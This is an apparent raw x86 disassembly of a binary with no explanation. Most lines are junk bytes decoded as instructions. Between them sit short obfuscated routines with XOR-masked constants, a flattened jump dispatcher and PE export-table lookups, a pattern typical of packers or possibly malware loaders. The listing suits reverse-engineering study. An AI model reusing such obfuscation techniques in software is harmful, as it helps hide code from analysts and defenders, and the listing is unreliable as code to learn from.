  408cfd:	xchg   edx,eax
  408cfe:	bound  edi,QWORD PTR [esi]
  408d00:	enter  0xfd2a,0x5
  408d04:	sbb    DWORD PTR [ebx+eiz*4+0x15],esp
  408d08:	xchg   edi,eax
  408d09:	push   edi
  408d0a:	cmc    
  408d0b:	int3   
  408d0c:	pop    edi
  408d0d:	dec    ecx
  408d0e:	shl    esp,1
  408d10:	loop   0x408d4b
  408d12:	stc    
  408d13:	pop    edi
  408d14:	fwait
  408d15:	out    0x42,al
  408d17:	retf   0xb8a4
  408d1a:	pusha  
  408d1b:	shl    DWORD PTR [edi],0x22
  408d1e:	inc    esi
  408d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d20:	add    al,0x72
  408d22:	fimul  DWORD PTR [eax+ebx*8+0x21]
  408d26:	jmp    0xaab8e90f
  408d2b:	mov    esp,0x14083b4e
  408d30:	out    0x8f,al
  408d32:	dec    esi
  408d33:	adc    al,0xfa
  408d35:	push   0x441382e9
  408d3a:	and    al,0xa8
  408d3c:	int    0x6a
  408d3e:	sbb    eax,0x9b33724f
  408d43:	sub    BYTE PTR [edi+0x2dbf1857],dl
  408d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d4a:	push   edx
  408d4b:	out    dx,al
  408d4c:	xor    eax,0x2fcb1420
  408d51:	je     0x408d5a
  408d53:	lods   eax,DWORD PTR ds:[esi]
  408d54:	iret   
  408d55:	sub    al,0xdd
  408d57:	xor    ebx,ebx
  408d59:	fisttp WORD PTR [ecx+eiz*4+0x6e]
  408d5d:	in     eax,0xa3
  408d5f:	mov    ah,0xb7
  408d61:	xchg   esp,eax
  408d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d63:	mov    ds:0x9bab3512,al
  408d68:	ss iret 
  408d6a:	xchg   edx,eax
  408d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d6c:	stc    
  408d6d:	(bad)  
  408d6f:	xchg   esp,eax
  408d70:	int3   
  408d71:	and    bh,dh
  408d73:	nop
  408d74:	mov    eax,ds:0xf5f1aab
  408d79:	inc    esi
  408d7a:	out    dx,al
  408d7b:	push   edx
  408d7c:	lods   al,BYTE PTR ds:[esi]
  408d7d:	(bad)  
  408d7e:	mov    edx,0xc8f14ecf
  408d83:	xchg   BYTE PTR [esi+0x24],bh
  408d86:	sbb    dh,BYTE PTR ds:0x601787c7
  408d8c:	and    dh,dh
  408d8e:	sub    al,0x29
  408d90:	inc    eax
  408d91:	xchg   ecx,eax
  408d92:	mov    esp,0x32330fec
  408d97:	(bad)  
  408d99:	mov    ch,0xe
  408d9b:	sbb    BYTE PTR [edx],bh
  408d9d:	stc    
  408d9e:	dec    esp
  408d9f:	mov    edx,0xe691b508
  408da4:	xchg   edx,eax
  408da5:	dec    edx
  408da6:	in     al,0xbb
  408da8:	jbe    0x408e07
  408daa:	test   eax,0x93d7dc85
  408daf:	fdivr  st,st(1)
  408db1:	repz sti 
  408db3:	inc    ebp
  408db4:	xchg   ebp,eax
  408db5:	inc    ecx
  408db6:	jne    0x408d77
  408db8:	push   0x48
  408dba:	jb     0x408d8d
  408dbc:	jl     0x408d48
  408dbe:	icebp  
  408dbf:	out    0xcb,eax
  408dc1:	in     eax,dx
  408dc2:	inc    edi
  408dc3:	mov    cl,0xac
  408dc5:	mov    al,ds:0x2a2ae4c1
  408dca:	mov    ebx,0x3f028261
  408dcf:	dec    ecx
  408dd0:	in     eax,dx
  408dd1:	add    dl,BYTE PTR [ebp+eiz*4+0x1b]
  408dd5:	dec    ebp
  408dd6:	jbe    0x408dc8
  408dd8:	push   es
  408dd9:	pop    ecx
  408dda:	mov    bh,0xce
  408ddc:	and    BYTE PTR [ebx-0x16c1204b],ch
  408de2:	(bad)  
  408de4:	out    dx,al
  408de5:	std    
  408de6:	xor    eax,0x247c7d3f
  408deb:	inc    eax
  408dec:	(bad)  
  408ded:	out    0xf9,al
  408def:	in     eax,dx
  408df0:	fwait
  408df1:	bound  ecx,QWORD PTR [edi-0x65f453b9]
  408df7:	out    dx,eax
  408df8:	(bad)  
  408df9:	cmp    BYTE PTR [ebx+edx*2],dh
  408dfc:	out    0x87,eax
  408dfe:	mov    dl,0x58
  408e00:	inc    edx
  408e01:	push   ecx
  408e02:	gs xor eax,eax
  408e05:	(bad)  
  408e06:	test   DWORD PTR [bx+di],ecx
  408e09:	xor    DWORD PTR [edx],edi
  408e0b:	sbb    ch,BYTE PTR [edi-0x72]
  408e0e:	popf   
  408e0f:	mov    ch,0x1c
  408e11:	or     al,0x1f
  408e13:	and    al,0x45
  408e15:	pop    esi
  408e16:	repz mov ah,0xf7
  408e19:	mov    ebx,0x23dfb6aa
  408e1e:	ret    0x46ce
  408e21:	pop    edx
  408e22:	sbb    eax,0x6609b90b
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xd484cc98
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	into   
  408ec5:	sbb    ebx,DWORD PTR [edx-0x3aa7cea0]
  408ecb:	mov    ebx,0x8709c4b5
  408ed0:	dec    ebx
  408ed1:	and    edx,DWORD PTR ds:[ebx]
  408ed4:	ins    DWORD PTR es:[edi],dx
  408ed5:	lahf   
  408ed6:	jmp    FWORD PTR [ebp+0x2]
  408ed9:	and    al,0x95
  408edb:	ret    0xa203
  408ede:	(bad)  
  408edf:	in     al,0xe9
  408ee1:	sbb    DWORD PTR [ecx],0xde69ad55
  408ee7:	es cmp eax,0x141a368c
  408eed:	aad    0xc4
  408eef:	imul   DWORD PTR [ebp-0x3d]
  408ef2:	sbb    al,0x3d
  408ef4:	fwait
  408ef5:	cwde   
  408ef6:	adc    DWORD PTR [esi],0x5adff2f5
  408efc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408efd:	test   DWORD PTR [esi],0x88b32ee1
  408f03:	fidiv  WORD PTR [esi+0x5c]
  408f06:	mov    WORD PTR [ecx+0x3f08f69e],fs
  408f0c:	mov    ch,0xcb
  408f0e:	push   es
  408f0f:	mov    eax,ds:0xa1f4e7ac
  408f14:	cmp    DWORD PTR [edx],esp
  408f16:	outs   dx,DWORD PTR ds:[esi]
  408f17:	scas   eax,DWORD PTR es:[edi]
  408f18:	cmp    eax,0xf5748de6
  408f1d:	mov    DWORD PTR [ebx],edx
  408f1f:	mov    ds:0xd90c43ce,al
  408f24:	push   edx
  408f25:	jnp    0x408ef5
  408f27:	xchg   esi,eax
  408f28:	inc    ebx
  408f29:	sbb    BYTE PTR ds:[eax+0x79],cl
  408f2d:	shl    eax,0xe6
  408f30:	push   ss
  408f31:	or     ecx,esi
  408f33:	jne    0x408fa0
  408f35:	xor    eax,0x276fabf4
  408f3a:	mov    dl,0x66
  408f3c:	call   FWORD PTR [ebx]
  408f3e:	xchg   edi,eax
  408f3f:	add    bh,cl
  408f41:	cmp    eax,0xc9e85100
  408f46:	rcl    BYTE PTR [edi+0x75],1
  408f49:	stos   DWORD PTR es:[edi],eax
  408f4a:	pop    eax
  408f4b:	lea    esi,[eax-0x18]
  408f4e:	push   esp
  408f4f:	jmp    0x8c1bc40
  408f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f55:	leave  
  408f56:	mov    ch,0xb1
  408f58:	shl    ah,1
  408f5a:	das    
  408f5b:	mov    dh,al
  408f5d:	cmc    
  408f5e:	outs   dx,BYTE PTR ds:[esi]
  408f5f:	xor    eax,0x780d591b
  408f64:	xchg   ecx,eax
  408f65:	mov    bh,0x0
  408f67:	dec    ecx
  408f68:	cs cmp al,0x9c
  408f6b:	not    BYTE PTR [ecx-0x51]
  408f6e:	add    eax,edx
  408f70:	rcl    bh,0x23
  408f73:	es inc eax
  408f75:	fldcw  WORD PTR [edi+ecx*4]
  408f78:	adc    edi,ebp
  408f7a:	mov    esp,0x1591d6f6
  408f7f:	ror    DWORD PTR [ecx],cl
  408f81:	sbb    BYTE PTR [eax+ebx*4-0x447a2365],0xe4
  408f89:	mov    edi,0x95ab97d
  408f8e:	cmp    al,0x4f
  408f90:	ror    BYTE PTR [ebx],0xf2
  408f93:	lock stos BYTE PTR es:[edi],al
  408f95:	pop    eax
  408f96:	mov    cl,0x92
  408f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f99:	and    dh,BYTE PTR [edi+0x3a]
  408f9c:	push   edx
  408f9d:	leave  
  408f9e:	pop    edi
  408f9f:	sahf   
  408fa0:	inc    eax
  408fa1:	push   edi
  408fa2:	or     al,0x9c
  408fa4:	outs   dx,BYTE PTR ds:[esi]
  408fa5:	sbb    dh,BYTE PTR [edi]
  408fa7:	dec    edi
  408fa8:	adc    ah,bl
  408faa:	mov    ds:0xff6a9b76,al
  408faf:	rep lods al,BYTE PTR ds:[esi]
  408fb1:	imul   eax,DWORD PTR [ebx-0x1de52e8c],0xc0a1bbd9
  408fbb:	shl    BYTE PTR [ebx-0x4d80d88d],0xae
  408fc2:	retf   
  408fc3:	fnstcw WORD PTR [ebx]
  408fc5:	jbe    0x408fa8
  408fc7:	jae    0x408f62
  408fc9:	pusha  
  408fca:	jp     0x408fe2
  408fcc:	sahf   
  408fcd:	xchg   ecx,eax
  408fce:	add    bl,BYTE PTR [edx+0x6b]
  408fd1:	popa   
  408fd2:	dec    ebx
  408fd3:	sub    al,0xc2
  408fd5:	lods   eax,DWORD PTR ds:[esi]
  408fd6:	mov    DWORD PTR [edx-0x7f],ecx
  408fd9:	jmp    0x408ff4
  408fdb:	retf   
  408fdc:	add    cl,dl
  408fde:	lahf   
  408fdf:	mov    ch,0xa4
  408fe1:	add    eax,0xb7186155
  408fe6:	sub    edi,DWORD PTR [edi+ebp*1]
  408fe9:	rcr    ah,0xc9
  408fec:	jno    0x408f75
  408fee:	mov    BYTE PTR [edi+esi*2+0x3],0x41
  408ff3:	and    ecx,ebx
  408ff5:	stos   BYTE PTR es:[edi],al
  408ff6:	push   0x10944bfa
  408ffb:	add    al,0x73
  408ffd:	ins    DWORD PTR es:[edi],dx
  408ffe:	xchg   ebx,eax
  408fff:	jbe    0x409058
  409001:	sbb    eax,0xbb9ebd1d
  409006:	cmp    al,0xb5
  409008:	add    al,al
  40900a:	adc    BYTE PTR [ebx-0x4715c98e],ch
  409010:	ja     0x408fb6
  409012:	inc    ebx
  409013:	xchg   ecx,eax
  409014:	jmp    DWORD PTR ds:0xca83585d
  40901a:	outs   dx,DWORD PTR ds:[esi]
  40901b:	rcr    BYTE PTR [eax],0xda
  40901e:	and    ah,ah
  409020:	or     BYTE PTR [esi+0x16d9db6],0x7a
  409027:	aad    0xef
  409029:	sbb    dh,ch
  40902b:	xchg   ecx,eax
  40902c:	sar    BYTE PTR [ebx],cl
  40902e:	int3   
  40902f:	idiv   BYTE PTR [ebx+ebx*8-0x3ee105f2]
  409036:	mov    bh,0x70
  409038:	push   ebp
  409039:	test   BYTE PTR [ebp-0x3040a660],cl
  40903f:	loope  0x409074
  409041:	push   edi
  409042:	cld    
  409043:	int    0xae
  409045:	add    bl,BYTE PTR [esi*2+0x215c0b44]
  40904c:	and    DWORD PTR [ebx+0x771a4e9],0xffb74d1
  409056:	sbb    cl,BYTE PTR [eax+0x6d]
  409059:	or     edi,DWORD PTR fs:[edx-0x74]
  40905d:	mov    edi,eax
  40905f:	dec    ebp
  409060:	out    dx,al
  409061:	jg     0x40900e
  409063:	push   0xe3144f23
  409068:	repnz fst QWORD PTR [ebx]
  40906b:	mov    dl,0x6d
  40906d:	jns    0x40907a
  40906f:	in     al,0x59
  409071:	cmp    ch,bl
  409073:	cmp    esi,esp
  409075:	out    0xfb,al
  409077:	mov    ecx,0x29fa4903
  40907c:	inc    esi
  40907d:	pop    edx
  40907e:	imul   edx,DWORD PTR [ebp+0x1f],0x26
  409082:	mov    ah,0x7b
  409084:	fist   WORD PTR [eax+ebp*4+0x1595c336]
  40908b:	(bad)  
  40908c:	shr    BYTE PTR [edx],1
  40908e:	into   
  40908f:	cmp    eax,0x95f5f857
  409094:	ins    BYTE PTR es:[edi],dx
  409095:	dec    edi
  409096:	mov    edx,0x8eab7cb8
  40909b:	xlat   BYTE PTR ds:[ebx]
  40909c:	inc    edx
  40909d:	(bad)  
  40909f:	mov    dh,0xfd
  4090a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090a2:	hlt    
  4090a3:	int3   
  4090a4:	shr    BYTE PTR [edi],cl
  4090a6:	adc    bl,0x34
  4090a9:	jp     0x409127
  4090ab:	push   ebp
  4090ac:	pop    esp
  4090ad:	dec    ebx
  4090ae:	stos   BYTE PTR es:[edi],al
  4090af:	and    dl,BYTE PTR ds:0x4847bd9f
  4090b5:	mov    dh,0x4d
  4090b7:	stos   BYTE PTR es:[edi],al
  4090b8:	mov    ebx,0x578bd994
  4090bd:	adc    esp,DWORD PTR [esp+eax*8-0x2515c4f4]
  4090c4:	mov    ebx,0xa62783b9
  4090c9:	mov    esp,DWORD PTR [esp+edx*4+0x7]
  4090cd:	sbb    bh,dl
  4090cf:	arpl   WORD PTR [edx+edx*1],ax
  4090d2:	lea    ebp,[edx-0x1b5cf5c]
  4090d8:	pop    es
  4090d9:	mov    al,0x37
  4090db:	xchg   ecx,eax
  4090dc:	mov    ?,WORD PTR [edi]
  4090de:	ds int 0xc4
  4090e1:	jl     0x4090c4
  4090e3:	daa    
  4090e4:	aam    0xa6
  4090e6:	push   es
  4090e7:	push   esp
  4090e8:	pop    esi
  4090e9:	nop
  4090ea:	dec    esi
  4090eb:	cwde   
  4090ec:	clc    
  4090ed:	(bad)  
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xa1
  409163:	mov    edi,0xdf323c59
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	aam    0x1a
  409170:	test   al,0x21
  409172:	adc    ecx,edx
  409174:	inc    edx
  409175:	sti    
  409176:	fisttp DWORD PTR [esi-0x75]
  409179:	mulps  xmm3,XMMWORD PTR [esi+edx*4-0x1ad08e33]
  409181:	ror    cl,1
  409183:	js     0x409141
  409185:	and    ch,BYTE PTR [edx]
  409187:	daa    
  409188:	push   edi
  409189:	push   0x9
  40918b:	mov    al,ds:0xfae04082
  409190:	fsubr  st(0),st
  409192:	jg     0x4091e6
  409194:	push   esi
  409195:	das    
  409196:	out    0x17,eax
  409198:	ss add eax,0x4146b209
  40919e:	out    dx,al
  40919f:	cmp    BYTE PTR [eax],dh
  4091a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a2:	(bad)  
  4091a3:	aad    0x81
  4091a5:	sti    
  4091a6:	dec    eax
  4091a7:	and    al,bl
  4091a9:	push   eax
  4091aa:	rcl    DWORD PTR [esi-0x65],1
  4091ad:	add    eax,edx
  4091af:	mov    dh,bl
  4091b1:	imul   esp,DWORD PTR [esi+0x3e],0xe43eca11
  4091b8:	out    0x25,eax
  4091ba:	fs inc eax
  4091bc:	(bad)  
  4091bd:	jp     0x409199
  4091bf:	scas   al,BYTE PTR es:[edi]
  4091c0:	add    BYTE PTR [esi],0xca
  4091c3:	ins    BYTE PTR es:[edi],dx
  4091c4:	push   0x35aa07e7
  4091c9:	sub    al,0x7d
  4091cb:	call   0x68e1:0xac9af642
  4091d2:	int3   
  4091d3:	inc    edi
  4091d4:	and    ebx,DWORD PTR [esi+0x1f86dea3]
  4091da:	repnz out dx,eax
  4091dc:	mov    al,ds:0x48e26cd7
  4091e1:	mov    dh,0x18
  4091e3:	pop    ebp
  4091e4:	inc    edx
  4091e5:	clc    
  4091e6:	mov    bh,0x7
  4091e8:	and    ebp,DWORD PTR [esi]
  4091ea:	add    al,cl
  4091ec:	sar    BYTE PTR [ecx+0x69],cl
  4091ef:	push   ds
  4091f0:	aaa    
  4091f1:	sbb    BYTE PTR [esi+edi*2-0x3df40155],al
  4091f8:	push   cs
  4091f9:	cmp    BYTE PTR [ebx+0x1f],dl
  4091fc:	xchg   BYTE PTR [edi+0x59614642],bl
  409202:	outs   dx,BYTE PTR ds:[esi]
  409203:	clc    
  409204:	(bad)  
  409205:	icebp  
  409206:	cmp    al,0x2f
  409208:	adc    BYTE PTR [ebp+0x28],0xf6
  40920c:	xchg   edi,eax
  40920d:	test   DWORD PTR [ecx+0x486a9b07],ebx
  409213:	test   BYTE PTR [ebx+eax*1-0x6a],dl
  409217:	jl     0x409268
  409219:	loope  0x409299
  40921b:	retf   
  40921c:	pop    es
  40921d:	xor    BYTE PTR [edi-0x22202927],0xbe
  409224:	pop    ebx
  409225:	jecxz  0x4091b2
  409227:	sbb    al,0x17
  409229:	dec    ecx
  40922a:	out    dx,al
  40922b:	fwait
  40922c:	adc    al,BYTE PTR [ebx]
  40922e:	mov    cl,0x83
  409230:	cmp    BYTE PTR [esi-0x39],ah
  409233:	(bad)  
  409234:	xor    esp,ebp
  409236:	(bad)  
  409237:	mov    ebx,0x50f1fde7
  40923c:	mov    bh,bl
  40923e:	loopne 0x40920a
  409240:	add    ecx,eax
  409242:	pop    ss
  409243:	and    eax,0xb9797068
  409248:	(bad)  
  409249:	(bad)  
  40924a:	imul   edi,DWORD PTR [eax+0x40],0x935ab081
  409251:	mov    eax,ds:0x1cfcc6fc
  409256:	add    eax,ebp
  409258:	cli    
  409259:	dec    esi
  40925a:	loope  0x4092d4
  40925c:	daa    
  40925d:	jbe    0x40922f
  40925f:	test   eax,0x3b6dd071
  409264:	enter  0x414f,0x3b
  409268:	pop    ecx
  409269:	loope  0x409275
  40926b:	push   ecx
  40926c:	popf   
  40926d:	cmp    DWORD PTR [eax-0x4e91f42e],0xffffff9f
  409274:	adc    ecx,DWORD PTR [edx+0x62905ab5]
  40927a:	xchg   edx,eax
  40927b:	jp     0x40921b
  40927d:	dec    eax
  40927e:	xchg   ecx,eax
  40927f:	ins    BYTE PTR es:[edi],dx
  409280:	idiv   BYTE PTR [edx-0x3b]
  409283:	js     0x409280
  409285:	loope  0x409284
  409287:	jecxz  0x40929c
  409289:	call   0xa9918c5b
  40928e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40928f:	dec    eax
  409290:	pop    edx
  409291:	dec    esi
  409292:	pop    ebx
  409293:	daa    
  409294:	rol    DWORD PTR [edi-0x31],1
  409297:	jg     0x4092ca
  409299:	cmp    eax,eax
  40929b:	adc    ch,bl
  40929d:	call   0xfcea678a
  4092a2:	jo     0x40925a
  4092a4:	mov    edx,0x1c2ebf8b
  4092a9:	push   ebx
  4092aa:	add    edi,DWORD PTR [edx+0x4e]
  4092ad:	dec    ebx
  4092ae:	popa   
  4092af:	enter  0xb659,0x38
  4092b3:	(bad)  
  4092b5:	icebp  
  4092b6:	jle    0x4092ee
  4092b8:	jns    0x40932a
  4092ba:	sar    bh,cl
  4092bc:	xchg   esp,eax
  4092bd:	sti    
  4092be:	mov    dl,0xe0
  4092c0:	jmp    0xc469:0x37d7637d
  4092c7:	push   edi
  4092c8:	cmp    esi,DWORD PTR [ecx]
  4092ca:	cmp    eax,0x9e371b1f
  4092cf:	in     eax,0xbb
  4092d1:	mov    al,0x17
  4092d3:	mov    ch,0x29
  4092d5:	mov    edi,0x40d5860f
  4092da:	push   ss
  4092db:	lods   al,BYTE PTR ds:[esi]
  4092dc:	jg     0x40927c
  4092de:	rol    BYTE PTR [ecx-0x58a5e53f],cl
  4092e4:	jmp    0xf057a73e
  4092e9:	dec    eax
  4092ea:	dec    ecx
  4092eb:	mov    al,ds:0xd2857ae0
  4092f0:	jle    0x40931b
  4092f2:	scas   al,BYTE PTR es:[edi]
  4092f3:	ror    BYTE PTR [esp+ebx*1],0x3d
  4092f7:	iret   
  4092f8:	into   
  4092f9:	pop    esi
  4092fa:	bound  edx,QWORD PTR [ebx+0x10]
  4092fd:	shl    BYTE PTR es:[edx+0x1a],1
  409301:	mov    edi,0xe6062414
  409306:	mov    ecx,DWORD PTR [ebp-0x48]
  409309:	aad    0xf8
  40930b:	data16 jo 0x409342
  40930e:	das    
  40930f:	add    al,0x55
  409311:	(bad)  [ebp+0x6939f245]
  409317:	dec    edi
  409318:	jmp    0xfa16:0xa8ab5c9
  40931f:	outs   dx,DWORD PTR ds:[esi]
  409320:	call   0xb6624140
  409325:	ror    edi,1
  409327:	or     DWORD PTR [eax-0x9f28967],edi
  40932d:	test   eax,0x2e554be1
  409332:	sbb    eax,0x25ee699a
  409337:	dec    eax
  409338:	and    edx,0x73
  40933b:	mov    dl,0x43
  40933d:	imul   edx,DWORD PTR [ebp+esi*4+0x73],0x1e
  409342:	jnp    0x409304
  409344:	(bad)  
  409346:	xor    ebp,edi
  409348:	mov    ds:0x6c10d7a6,al
  40934d:	rol    BYTE PTR [edx+0xc],1
  409350:	xchg   esi,eax
  409351:	ds jne 0x40935a
  409354:	jno    0x4092e3
  409356:	in     al,0x49
  409358:	adc    BYTE PTR [eax],0xe5
  40935b:	ins    DWORD PTR es:[edi],dx
  40935c:	neg    BYTE PTR [eax+0x8]
  40935f:	dec    edi
  409360:	mov    dl,0xb1
  409362:	pop    ss
  409363:	es mov ax,0xec26
  409368:	xor    BYTE PTR ds:0x38b1104f,dh
  40936e:	pop    edx
  40936f:	push   ebp
  409370:	std    
  409371:	dec    eax
  409372:	pop    esp
  409373:	sbb    eax,0xa57b2448
  409378:	add    edx,DWORD PTR [eax+eax*4]
  40937b:	xchg   DWORD PTR [edi-0x6d],ebp
  40937e:	xor    DWORD PTR [ebp+0x45],ebp
  409381:	call   0x4090:0xb96cf0d9
  409388:	sbb    eax,0x698769e0
  40938d:	xchg   esp,eax
  40938e:	jecxz  0x409383
  409390:	sub    cl,BYTE PTR [ebp-0x98103e1]
  409396:	inc    edx
  409397:	bound  ecx,QWORD PTR [ecx+0xc458b08]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	pop    eax
  4093b5:	daa    
  4093b6:	fnstenv [edi-0x28]
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	xchg   BYTE PTR [edi],bl
  4093c2:	mov    esi,0x1e4eeae6
  4093c7:	out    dx,al
  4093c8:	ficom  WORD PTR [ebx-0x1a]
  4093cb:	das    
  4093cc:	xchg   DWORD PTR [edi-0x68],ebp
  4093cf:	stos   BYTE PTR es:[edi],al
  4093d0:	rcr    BYTE PTR [esi+0x1119f170],cl
  4093d6:	int3   
  4093d7:	in     eax,dx
  4093d8:	jae    0x40935a
  4093da:	mov    bl,0x47
  4093dc:	das    
  4093dd:	test   eax,0xaab1e963
  4093e2:	sbb    BYTE PTR [edx-0x48],dl
  4093e5:	adc    eax,0x5d4d46dc
  4093ea:	iret   
  4093eb:	test   DWORD PTR [edx+eiz*1],esi
  4093ee:	add    al,0x45
  4093f0:	sbb    ecx,edx
  4093f2:	ins    BYTE PTR es:[edi],dx
  4093f3:	scas   eax,DWORD PTR es:[edi]
  4093f4:	mov    WORD PTR [edx+0x43790e5e],gs
  4093fa:	inc    esp
  4093fb:	add    al,0xfd
  4093fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093fe:	sahf   
  4093ff:	fsubr  st,st(0)
  409401:	sub    DWORD PTR [ebp+ebp*2-0x148c4bd1],ecx
  409408:	xchg   ebp,eax
  409409:	sub    dl,BYTE PTR [edx+0x516a256c]
  40940f:	adc    al,0xcd
  409411:	fcmovu st,st(2)
  409413:	dec    ebx
  409414:	scas   eax,DWORD PTR es:[edi]
  409415:	jo     0x4093af
  409417:	push   ebp
  409418:	add    cl,BYTE PTR [esp+eiz*8]
  40941b:	xchg   edx,eax
  40941c:	add    DWORD PTR [ebx-0x74ba2cd5],eax
  409422:	addr16 test al,0xd2
  409425:	stos   DWORD PTR es:[edi],eax
  409426:	test   al,0x85
  409428:	repz in eax,0x8
  40942b:	sub    al,0x36
  40942d:	mov    dl,0xd7
  40942f:	test   DWORD PTR [ebx],ebx
  409431:	push   ecx
  409432:	ins    BYTE PTR es:[edi],dx
  409433:	lahf   
  409434:	mov    dl,cl
  409436:	add    DWORD PTR [ebx],ebp
  409438:	gs aas 
  40943a:	xor    eax,0xe0dbb2b6
  40943f:	fiadd  WORD PTR [ebp+ebp*4-0x23]
  409443:	retf   
  409444:	push   edi
  409445:	int    0x30
  409447:	fcomp  st(3)
  409449:	int    0xe7
  40944b:	outs   dx,DWORD PTR ds:[esi]
  40944c:	fldenv [esi+0x68]
  40944f:	out    0xb7,al
  409451:	pop    ds
  409452:	cld    
  409453:	scas   al,BYTE PTR es:[edi]
  409454:	push   ecx
  409455:	mov    ch,0x5f
  409457:	in     al,dx
  409458:	shr    DWORD PTR [edx+0x25a9bf76],0xf2
  40945f:	jne    0x4094a5
  409461:	jmp    0xf5d94951
  409466:	jl     0x4094b2
  409468:	mov    ch,0x9f
  40946a:	mov    ebp,0xe5a0146a
  40946f:	in     eax,dx
  409470:	daa    
  409471:	cmp    DWORD PTR [eax],0x9a5519e2
  409477:	mov    ebx,ss
  409479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40947a:	rcl    BYTE PTR [ecx-0x5517bdab],1
  409480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409482:	or     BYTE PTR [edx+edx*2+0x5],0x24
  409487:	cmp    BYTE PTR [edi+0x243fe3f7],ah
  40948d:	or     al,0xf8
  40948f:	hlt    
  409490:	push   ebx
  409491:	jae    0x4094f8
  409493:	int3   
  409494:	(bad)  
  409495:	mov    ds,edi
  409497:	scas   al,BYTE PTR es:[edi]
  409498:	scas   al,BYTE PTR es:[edi]
  409499:	adc    edi,DWORD PTR [ebp-0x5ec636cf]
  40949f:	je     0x4094bc
  4094a1:	cmp    esi,0x33
  4094a4:	outs   dx,BYTE PTR ds:[esi]
  4094a5:	ds xchg edx,eax
